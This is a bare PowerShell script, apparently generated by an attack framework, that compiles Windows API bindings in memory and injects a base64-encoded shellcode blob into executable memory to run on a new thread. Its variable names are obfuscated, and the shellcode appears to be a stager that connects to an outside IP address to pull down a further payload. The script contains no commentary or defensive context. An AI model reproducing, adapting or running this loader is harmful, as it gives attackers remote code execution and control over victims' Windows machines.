Set-StrictMode -Version 2
$cTP = @"
	using System;
	using System.Runtime.InteropServices;
	namespace iuV6 {
		public class func {
			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
			[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
		}
	}
"@

$cQw = New-Object Microsoft.CSharp.CSharpCodeProvider
$eL = New-Object System.CodeDom.Compiler.CompilerParameters
$eL.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$eL.GenerateInMemory = $True
$gU7 = $cQw.CompileAssemblyFromSource($eL, $cTP)

[Byte[]]$ovpO = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmi5XN8YaAIAH5CJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vwtaJWagBT/9U=")

$o5G = [iuV6.func]::VirtualAlloc(0, $ovpO.Length + 1, [iuV6.func+AllocationType]::Reserve -bOr [iuV6.func+AllocationType]::Commit, [iuV6.func+MemoryProtection]::ExecuteReadWrite)
if ([Bool]!$o5G) { $global:result = 3; return }
[System.Runtime.InteropServices.Marshal]::Copy($ovpO, 0, $o5G, $ovpO.Length)
[IntPtr] $gX = [iuV6.func]::CreateThread(0,0,$o5G,0,0,0)
if ([Bool]!$gX) { $global:result = 7; return }
$ln = [iuV6.func]::WaitForSingleObject($gX, [iuV6.func+Time]::Infinite)
